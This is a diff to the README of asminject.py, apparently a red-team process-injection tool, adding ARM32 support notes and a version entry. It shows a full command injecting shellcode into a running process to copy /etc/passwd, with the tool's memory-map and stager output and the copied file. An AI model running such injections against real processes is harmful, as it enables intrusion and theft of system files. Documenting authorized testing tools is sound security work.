@@ -424,11 +424,93 @@ As the message indicates, this type of binary can be manually flagged using one 
 
 ```
 
+### Multi-architecture support
+
+As of v0.7, *asminject.py* has very basic support for execution in 32-bit ARM versions of Linux, like a Raspberry Pi:
+
+```
+# python3 ./asminject.py 18361 asm/arm32/copy_file_using_syscalls.s --arch arm32 --var sourcefile "/etc/passwd" --var destfile "/home/pi/test_copy.txt" --stop-method "slow" --pause false --preserve-temp-files
+
+                     .__            __               __
+  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
+ / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
+/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
+\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
+        \/                   \/\______|    \/     \/     \/|__|   \/
+
+asminject.py
+v0.7
+Ben Lincoln, Bishop Fox, 2021-09-02
+https://github.com/BishopFox/asminject
+based on dlinject, which is Copyright (c) 2019 David Buchanan
+dlinject source: https://github.com/DavidBuchanan314/dlinject
+
+[!] A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.
+[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
+[*] Current process priority for asminject.py (PID: 18412) is 0
+[*] Current CPU affinity for asminject.py (PID: 18412) is [0, 1, 2, 3]
+[*] Current process priority for target process (PID: 18361) is 0
+[*] Current CPU affinity for target process (PID: 18361) is [0, 1, 2, 3]
+[*] Setting process priority for asminject.py (PID: 18412) to -20
+[*] Setting process priority for target process (PID: 18361) to 20
+[*] Setting CPU affinity for target process (PID: 18361) to [0, 1, 2, 3]
+[*] RIP: 0xb6dab668
+[*] RSP: 0xbea27248
+[*] '/usr/bin/python2.7' has a base address of 65536, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "/usr/bin/python2.7" to your asminject.py options.
+[*] '0' has a base address of 3117056, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "0" to your asminject.py options.
+[*] /lib/arm-linux-gnueabihf/ld-2.28.so: 0x00000000b6f52000
+[*] /lib/arm-linux-gnueabihf/libc-2.28.so: 0x00000000b6cdb000
+[*] /lib/arm-linux-gnueabihf/libdl-2.28.so: 0x00000000b6ee9000
+[*] /lib/arm-linux-gnueabihf/libm-2.28.so: 0x00000000b6e29000
+[*] /lib/arm-linux-gnueabihf/libpthread-2.28.so: 0x00000000b6efc000
+[*] /lib/arm-linux-gnueabihf/libutil-2.28.so: 0x00000000b6ed6000
+[*] /lib/arm-linux-gnueabihf/libz.so.1.2.11: 0x00000000b6eab000
+[*] /usr/bin/python2.7: 0x0000000000010000
+[*] /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so: 0x00000000b6f3d000
+[*] /usr/lib/locale/locale-archive: 0x00000000b67a1000
+[*] 0: 0x00000000002f9000
+[*] [heap]: 0x00000000015d9000
+[*] [sigpage]: 0x00000000bed0a000
+[*] [stack]: 0x00000000bea07000
+[*] [vdso]: 0x00000000bed0c000
+[*] [vectors]: 0x00000000ffff0000
+[*] [vvar]: 0x00000000bed0b000
+[*] Writing assembled binary to /tmp/tmp_w1dd1w_.o
+[*] Converting executable '/tmp/tmp_w1dd1w_.o' to raw binary file /tmp/tmp2g590n5a.o
+[*] Wrote first stage shellcode at 00000000b6dab668 in target process 18361
+[*] Writing assembled binary to /tmp/tmpb8tocgf8.o
+[*] Converting executable '/tmp/tmpb8tocgf8.o' to raw binary file /tmp/tmpw9aq3eke.o
+[*] Wrote stage 2 to '/tmp/tmpjty737ff'
+[*] Returning to normal time...
+[*] Setting process priority for asminject.py (PID: 18412) to 0
+[*] Setting process priority for target process (PID: 18361) to 0
+[*] Setting CPU affinity for target process (PID: 18361) to [0, 1, 2, 3]
+[+] Done!
+
+
+# cat /home/pi/test_copy.txt 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+...omitted for brevity...
+```
+
+Currently, only one example shellcode file is provided (copy files using syscalls), and only the file-based stager is available.
+
 ### But what about Yama's ptrace_scope restrictions?
 
 If you are an authorized administrator of a Linux system where someone has accidentally set */proc/sys/kernel/yama/ptrace_scope* to 3, or are conducting an authorized penetration test of an environment where that value has been set, see the <a href="ptrace_scope_kernel_module/">ptrace_scope_kernel_module directory</a>.
 
 ## Version history
+
+### 0.7 (2021-09-02)
+
+* Still an internal development build
+* First version to include basic support for 32-bit ARM targets
+* Made all of the existing x86-64 shellcode files dependent on less specific versions of libraries, where applicable
+* Various other bug fixes and enhancements
 
 ### 0.6 (2021-09-01)
 
